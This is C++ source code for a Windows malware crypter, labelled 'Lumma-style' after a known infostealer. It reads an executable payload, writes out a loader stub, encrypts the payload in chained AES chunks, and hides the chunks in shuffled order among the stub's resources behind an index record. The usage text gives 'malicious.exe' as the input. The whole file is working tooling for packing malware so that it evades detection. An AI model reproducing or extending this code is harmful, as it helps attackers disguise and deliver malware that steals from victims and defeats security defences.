#include <iostream>
#include <windows.h>
#include <fstream>
#include <vector>
#include <cstdint>
#include <algorithm>
#include <random>
#include <ctime>
#include <wincrypt.h>
#include <map>
#include <string>
#include <sstream>
#include "stub_bytes.h"
#pragma comment(lib, "advapi32.lib")
using namespace std;

#define MAGIC_VALUE        0x474E5089
#define DEFAULT_OUTPUT     "Stub.exe"

// STRUCTURES
#pragma pack(push, 1)
struct PayloadIndex {
    uint32_t magic = MAGIC_VALUE;
    uint8_t  first_key;
    uint32_t total_size;
    uint16_t chunk_count;
    uint16_t first_chunk_id;
    uint32_t crc32;
    uint16_t shuffle_seed;
};
#pragma pack(pop)

// GLOBAL VARIABLES
char* fileBuffer = nullptr;
string g_outputFile = DEFAULT_OUTPUT;
string g_inputFile = "";

// CLI PARSING AND ERROR HANDLING
struct CLIParams {
    string inputFile;
    string outputFile;
    bool showHelp;
    bool verbose;
};

void PrintUsage(const char* programName) {
    cout << "\n  LUMMA-STYLE CHAINED CRYPTER — WORKING AES VERSION\n\n";
    cout << "Usage: " << programName << " [OPTIONS]\n\n";
    cout << "Options:\n";
    cout << "  -i, --input <FILE>    Input executable to encrypt (required)\n";
    cout << "  -o, --output <FILE>   Output stub filename (default: " << DEFAULT_OUTPUT << ")\n";
    cout << "  -v, --verbose         Enable verbose output\n";
    cout << "  -h, --help            Show this help message\n\n";
    cout << "Examples:\n";
    cout << "  " << programName << " -i malicious.exe -o loader.exe\n";
    cout << "  " << programName << " --input payload.exe --output stub.exe\n";
    cout << "  " << programName << " -i payload.exe                     (uses default output)\n\n";
}

bool ParseCommandLine(int argc, char* argv[], CLIParams& params) {
    params.showHelp = false;
    params.verbose = false;
    params.inputFile = "";
    params.outputFile = DEFAULT_OUTPUT;

    // Check if no arguments provided (except program name)
    if (argc == 1) {
        params.showHelp = true;
        return false;
    }

    // Parse arguments
    for (int i = 1; i < argc; i++) {
        string arg = argv[i];
        
        if (arg == "-h" || arg == "--help") {
            params.showHelp = true;
            return true;
        }
        else if (arg == "-v" || arg == "--verbose") {
            params.verbose = true;
        }
        else if (arg == "-i" || arg == "--input") {
            if (i + 1 < argc) {
                params.inputFile = argv[++i];
                g_inputFile = params.inputFile;
            } else {
                cerr << "[-] Error: Missing argument for " << arg << endl;
                return false;
            }
        }
        else if (arg == "-o" || arg == "--output") {
            if (i + 1 < argc) {
                params.outputFile = argv[++i];
                g_outputFile = params.outputFile;
            } else {
                cerr << "[-] Error: Missing argument for " << arg << endl;
                return false;
            }
        }
        else {
            // Handle legacy format (no flags) for backward compatibility
            if (i == 1 && params.inputFile.empty()) {
                params.inputFile = arg;
                g_inputFile = params.inputFile;
                cout << "[*] Using legacy format, please use -i flag in the future" << endl;
            } else {
                cerr << "[-] Error: Unknown argument '" << arg << "'" << endl;
                return false;
            }
        }
    }

    // Validate required parameters
    if (params.inputFile.empty()) {
        cerr << "[-] Error: Input file is required" << endl;
        return false;
    }

    // Validate file extensions
    if (params.outputFile.size() < 4 || 
        params.outputFile.substr(params.outputFile.size() - 4) != ".exe") {
        params.outputFile += ".exe";
        g_outputFile = params.outputFile;
        if (params.verbose) {
            cout << "[*] Added .exe extension to output file" << endl;
        }
    }

    return true;
}

bool ValidateInputFile(const string& filename) {
    // Check if file exists
    DWORD attrib = GetFileAttributesA(filename.c_str());
    if (attrib == INVALID_FILE_ATTRIBUTES) {
        cerr << "[-] Error: Input file '" << filename << "' does not exist" << endl;
        return false;
    }

    // Check if it's a directory
    if (attrib & FILE_ATTRIBUTE_DIRECTORY) {
        cerr << "[-] Error: '" << filename << "' is a directory, not a file" << endl;
        return false;
    }

    // Check file size
    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        cerr << "[-] Error: Cannot open '" << filename << "' for reading" << endl;
        return false;
    }

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        CloseHandle(hFile);
        cerr << "[-] Error: Cannot determine file size of '" << filename << "'" << endl;
        return false;
    }
    
    if (fileSize.QuadPart == 0) {
        CloseHandle(hFile);
        cerr << "[-] Error: Input file '" << filename << "' is empty" << endl;
        return false;
    }

    if (fileSize.QuadPart > 100 * 1024 * 1024) { // 100MB limit
        CloseHandle(hFile);
        cerr << "[-] Error: Input file '" << filename << "' is too large (>100MB)" << endl;
        return false;
    }

    CloseHandle(hFile);
    return true;
}

bool ValidateOutputFile(const string& filename) {
    // Check if output file already exists
    DWORD attrib = GetFileAttributesA(filename.c_str());
    if (attrib != INVALID_FILE_ATTRIBUTES) {
        if (attrib & FILE_ATTRIBUTE_DIRECTORY) {
            cerr << "[-] Error: Output path '" << filename << "' is a directory" << endl;
            return false;
        }
        
        cout << "[!] Warning: Output file '" << filename << "' already exists" << endl;
        cout << "[?] Overwrite? (y/n): ";
        char response;
        cin >> response;
        if (response != 'y' && response != 'Y') {
            cout << "[-] Operation cancelled by user" << endl;
            return false;
        }
    }

    // Try to create the file to test write permissions
    ofstream testFile(filename, ios::binary);
    if (!testFile.is_open()) {
        cerr << "[-] Error: Cannot write to '" << filename << "' (permission denied?)" << endl;
        return false;
    }
    testFile.close();
    
    // Clean up test file
    DeleteFileA(filename.c_str());
    
    return true;
}

// CRC32
uint32_t CalculateCRC32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)(unsigned char)data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    return ~crc;
}

// FIXED FILE WRITING WITH DEBUG
bool WriteStubToFile() {
    cout << "[*] Writing stub to " << g_outputFile << "..." << endl;
    
    if (!Stub_exe || Stub_exe_len == 0) {
        cerr << "[-] Stub_exe data is NULL or zero length!" << endl;
        return false;
    }
    
    if (Stub_exe[0] != 'M' || Stub_exe[1] != 'Z') {
        cerr << "[-] Stub_exe doesn't have valid MZ signature!" << endl;
        return false;
    }
    
    ofstream f(g_outputFile.c_str(), ios::binary);
    if (!f.is_open()) {
        cerr << "[-] Cannot create " << g_outputFile << " file!" << endl;
        return false;
    }
    
    f.write((char*)Stub_exe, Stub_exe_len);
    f.close();
    
    // Verify the file was written
    ifstream test(g_outputFile.c_str(), ios::binary | ios::ate);
    if (!test.is_open()) {
        cerr << "[-] Failed to verify " << g_outputFile << " creation!" << endl;
        return false;
    }
    streamsize size = test.tellg();
    test.close();
    
    cout << "[+] " << g_outputFile << " created successfully (" << size << " bytes)" << endl;
    return (size == Stub_exe_len);
}

// SIMPLIFIED AES ENCRYPTION
std::vector<std::vector<BYTE>> EncryptPayloadChained(const char* payload, long size, uint8_t seed_key) {
    const int CHUNK_SIZE = 4096;
    int totalChunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
    std::vector<std::vector<BYTE>> encrypted_chunks;
    
    cout << "[*] Encrypting " << size << " bytes into " << totalChunks << " chunks..." << endl;

    BYTE aes_key[32] = {0};
    for (int i = 0; i < 32; i++) aes_key[i] = seed_key ^ (i * 0x11);

    vector<BYTE> last_ciphertext(16, 0);

    for (int i = 0; i < totalChunks; i++) {
        int chunk_start = i * CHUNK_SIZE;
        int original_len = min(CHUNK_SIZE, (int)(size - chunk_start));

        cout << "[*] Processing chunk " << i << " (" << original_len << " bytes)..." << endl;

        // Prepare data with PKCS7 padding
        int padded_len = ((original_len + 15) / 16) * 16;
        vector<BYTE> chunk_data(padded_len);
        memcpy(chunk_data.data(), payload + chunk_start, original_len);
        
        BYTE pad_value = padded_len - original_len;
        for (int j = original_len; j < padded_len; j++) {
            chunk_data[j] = pad_value;
        }

        HCRYPTPROV hProv = 0;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            cerr << "[-] CryptAcquireContext failed for chunk " << i << " - Error: " << GetLastError() << endl;
            continue;
        }

        // Prepare key blob
        struct {
            BLOBHEADER hdr;
            DWORD      dwKeySize;
            BYTE       key[32];
        } keyBlob = {0};

        keyBlob.hdr.bType    = PLAINTEXTKEYBLOB;
        keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
        keyBlob.hdr.reserved = 0;
        keyBlob.hdr.aiKeyAlg = CALG_AES_256;
        keyBlob.dwKeySize    = 32;
        memcpy(keyBlob.key, aes_key, 32);

        HCRYPTKEY hKey = 0;
        if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
            cerr << "[-] CryptImportKey failed for chunk " << i << " - Error: " << GetLastError() << endl;
            CryptReleaseContext(hProv, 0);
            continue;
        }

        // Set IV
        if (i > 0 && !last_ciphertext.empty()) {
            if (!CryptSetKeyParam(hKey, KP_IV, last_ciphertext.data(), 0)) {
                cerr << "[-] CryptSetKeyParam (IV) failed for chunk " << i << " - Error: " << GetLastError() << endl;
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                continue;
            }
        }

        DWORD encrypted_len = (DWORD)chunk_data.size();
        
        if (!CryptEncrypt(hKey, 0, FALSE, 0, chunk_data.data(), &encrypted_len, (DWORD)chunk_data.size())) {
            DWORD err = GetLastError();
            cerr << "[-] CryptEncrypt failed for chunk " << i << " - Error: " << err << endl;
            
            if (err == ERROR_MORE_DATA) {
                DWORD needed_size = encrypted_len;
                chunk_data.resize(needed_size);
                encrypted_len = (DWORD)chunk_data.size();
                
                if (!CryptEncrypt(hKey, 0, FALSE, 0, chunk_data.data(), &encrypted_len, (DWORD)chunk_data.size())) {
                    cerr << "[-] CryptEncrypt failed after resize for chunk " << i << " - Error: " << GetLastError() << endl;
                    CryptDestroyKey(hKey);
                    CryptReleaseContext(hProv, 0);
                    continue;
                }
            } else {
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                continue;
            }
        }

        chunk_data.resize(encrypted_len);

        if (encrypted_len >= 16) {
            last_ciphertext.assign(chunk_data.end() - 16, chunk_data.end());
        } else {
            last_ciphertext.assign(chunk_data.begin(), chunk_data.end());
            last_ciphertext.resize(16, 0);
        }

        encrypted_chunks.push_back(std::move(chunk_data));

        cout << "[+] Chunk " << i << " encrypted successfully (" << encrypted_len << " bytes)" << endl;

        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
    }

    if (encrypted_chunks.size() != totalChunks) {
        cerr << "[-] Encryption incomplete! Only " << encrypted_chunks.size() << " out of " << totalChunks << " chunks processed." << endl;
    } else {
        cout << "[+] All " << encrypted_chunks.size() << " chunks encrypted successfully!" << endl;
    }

    return encrypted_chunks;
}

// FIXED RESOURCE INJECTION WITH PROPER ERROR CHECKING
bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chunks, 
                             long payloadSize, uint8_t seed_key) {
    cout << "[*] Starting resource injection with shuffle..." << endl;
    
    DWORD attrib = GetFileAttributesA(g_outputFile.c_str());
    if (attrib == INVALID_FILE_ATTRIBUTES) {
        cerr << "[-] " << g_outputFile << " doesn't exist! Error: " << GetLastError() << endl;
        return false;
    }
    
    HANDLE hTest = CreateFileA(g_outputFile.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hTest == INVALID_HANDLE_VALUE) {
        cerr << "[-] " << g_outputFile << " is locked/in use! Error: " << GetLastError() << endl;
        return false;
    }
    CloseHandle(hTest);
    
    cout << "[+] " << g_outputFile << " is accessible, beginning resource update..." << endl;

    HANDLE hUpdate = BeginUpdateResourceA(g_outputFile.c_str(), FALSE);
    if (!hUpdate) {
        DWORD err = GetLastError();
        cerr << "[-] BeginUpdateResourceA failed! Error: " << err << endl;
        return false;
    }

    srand((unsigned)time(nullptr));
    uint16_t first_chunk_id = 300 + (rand() % 400);
    
    uint16_t shuffle_seed = (uint16_t)(GetTickCount() ^ rand());
    
     PayloadIndex index{};
    index.magic     = MAGIC_VALUE;
    index.first_key = seed_key;  // Store the seed in metadata
    index.total_size = static_cast<uint32_t>(payloadSize);
    index.chunk_count = static_cast<uint16_t>(encrypted_chunks.size());
    index.first_chunk_id = first_chunk_id;
    index.crc32 = CalculateCRC32(fileBuffer, payloadSize);
    index.shuffle_seed = shuffle_seed;
    
    cout << "[*] Using shuffle seed: " << shuffle_seed << endl;
    cout << "[*] Injecting index (ID 999) with " << encrypted_chunks.size() << " chunks starting at ID " << first_chunk_id << endl;

    // Inject index
    if (!UpdateResourceA(hUpdate, "RCDATA", MAKEINTRESOURCEA(999),
                         MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                         &index, sizeof(index))) {
        DWORD err = GetLastError();
        cerr << "[-] Failed to inject index! Error: " << err << endl;
        EndUpdateResourceA(hUpdate, TRUE);
        return false;
    }
    cout << "[+] Index injected successfully" << endl;
    
    // Create shuffled order
    std::vector<size_t> chunk_order(encrypted_chunks.size());
    for (size_t i = 0; i < encrypted_chunks.size(); ++i) {
        chunk_order[i] = i;
    }
    
    std::mt19937 rng(shuffle_seed);
    std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
    
    cout << "[*] Shuffled chunk order (first 10): ";
    for (size_t i = 0; i < min((size_t)10, chunk_order.size()); ++i) {
        cout << chunk_order[i] << " ";
    }
    if (chunk_order.size() > 10) cout << "...";
    cout << endl;

    // Inject chunks in shuffled order
    for (size_t resource_position = 0; resource_position < encrypted_chunks.size(); ++resource_position) {
        size_t logical_chunk_idx = chunk_order[resource_position];
        WORD resource_id = first_chunk_id + (WORD)resource_position;
        
        if (encrypted_chunks[logical_chunk_idx].empty()) {
            cerr << "[-] Logical chunk " << logical_chunk_idx << " is empty, skipping!" << endl;
            continue;
        }
        
        cout << "[+] Injecting logical chunk " << logical_chunk_idx 
             << " → Resource ID " << resource_id 
             << " (position " << resource_position << ")" << endl;
        
        if (!UpdateResourceA(hUpdate, "RCDATA", MAKEINTRESOURCEA(resource_id),
                             MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                             (LPVOID)encrypted_chunks[logical_chunk_idx].data(),
                             (DWORD)encrypted_chunks[logical_chunk_idx].size())) {
            DWORD err = GetLastError();
            cerr << "[-] Failed to inject chunk ID " << resource_id 
                 << " (logical chunk " << logical_chunk_idx << ")! Error: " << err << endl;
            EndUpdateResourceA(hUpdate, TRUE);
            return false;
        }
    }

    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        DWORD err = GetLastError();
        cerr << "[-] EndUpdateResource failed! Error: " << err << endl;
        return false;
    }

    cout << "\n[SUCCESS] All resources injected with shuffle!" << endl;
    cout << "          - Index at ID 999 with shuffle seed: " << shuffle_seed << endl;
    cout << "          - Chunks start at ID: " << first_chunk_id << endl;
    cout << "          - Total chunks: " << encrypted_chunks.size() << endl;
    
    return true;
}

// FILE OPERATIONS
bool ReadPayloadFile(const char* filename, char** buffer, long* size) {
    FILE* file = fopen(filename, "rb");
    if (!file) {
        cerr << "[-] Error: Cannot open file '" << filename << "' for reading" << endl;
        return false;
    }
    
    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    rewind(file);
    
    if (*size == 0) {
        fclose(file);
        cerr << "[-] Error: File '" << filename << "' is empty" << endl;
        return false;
    }
    
    *buffer = (char*)malloc(*size);
    if (!*buffer) {
        fclose(file);
        cerr << "[-] Error: Memory allocation failed for file buffer" << endl;
        return false;
    }
    
    size_t bytesRead = fread(*buffer, 1, *size, file);
    fclose(file);
    
    if (bytesRead != *size) {
        free(*buffer);
        *buffer = nullptr;
        cerr << "[-] Error: Failed to read entire file" << endl;
        return false;
    }
    
    return true;
}

bool ValidatePEArchitecture(char* buf) {
    auto dos = (IMAGE_DOS_HEADER*)buf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        cerr << "[-] Error: Not a valid PE file (missing MZ signature)" << endl;
        return false;
    }
    
    auto nt = (IMAGE_NT_HEADERS64*)(buf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        cerr << "[-] Error: Not a valid PE file (missing PE signature)" << endl;
        return false;
    }
    
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        cerr << "[-] Error: Only x64 executables are supported" << endl;
        return false;
    }
    
    return true;
}

void Cleanup() {
    if (fileBuffer) {
        free(fileBuffer);
        fileBuffer = nullptr;
    }
}

// MAIN FUNCTION
int main(int argc, char* argv[]) {
    system("color 0a");
    
    CLIParams params;
    
    // Parse command line arguments
    if (!ParseCommandLine(argc, argv, params)) {
        PrintUsage(argv[0]);
        system("pause");
        return 1;
    }
    
    if (params.showHelp) {
        PrintUsage(argv[0]);
        system("pause");
        return 0;
    }
    
    // Validate input file
    if (!ValidateInputFile(params.inputFile)) {
        system("pause");
        return 1;
    }
    
    // Validate output file
    if (!ValidateOutputFile(params.outputFile)) {
        system("pause");
        return 1;
    }
    cout << "[*] Configuration:\n";
    cout << "    Input file:  " << params.inputFile << endl;
    cout << "    Output file: " << params.outputFile << endl;
    cout << "    Verbose:     " << (params.verbose ? "Yes" : "No") << endl;
    cout << endl;
    
    long size = 0;
    
    cout << "[*] Reading payload file: " << params.inputFile << endl;
    if (!ReadPayloadFile(params.inputFile.c_str(), &fileBuffer, &size) || size == 0) {
        cerr << "[-] Failed to read payload file" << endl;
        system("pause");
        return 1;
    }
    cout << "[+] Payload read: " << size << " bytes" << endl;
    
    srand(static_cast<unsigned int>(time(nullptr)));
    uint8_t random_seed = static_cast<uint8_t>(rand() % 256);

    if (!ValidatePEArchitecture(fileBuffer)) {
        Cleanup();
        system("pause");
        return 1;
    }


    cout << "[+] Valid x64 PE confirmed" << endl;
    
    if (!WriteStubToFile()) {
        Cleanup();
        system("pause");
        return 1;
    }
    
    Sleep(100);
    
    cout << "[*] Starting encryption process..." << endl;
    auto chunks = EncryptPayloadChained(fileBuffer, size, random_seed);
    
    if (chunks.empty()) {
        cerr << "[-] Encryption produced no chunks!" << endl;
        Cleanup();
        system("pause");
        return 1;
    }
    
    cout << "[*] Encryption completed, injecting resources..." << endl;
 if (!InjectWithSeparateIndex(chunks, size, random_seed)) {
        Cleanup();
        system("pause");
        return 1;
    }
    
    Cleanup();
    cout << "\n[SUCCESS] " << g_outputFile << " created with AES encryption!\n";
    cout << "[NOTE] Make sure your stub uses the SAME AES decryption logic!\n";
    
    // Show summary
    cout << "\n[*] Summary:\n";
    cout << "    Input:  " << params.inputFile << endl;
    cout << "    Output: " << params.outputFile << endl;
    cout << "    Size:   " << size << " bytes" << endl;
    
    system("pause");
    return 0;
}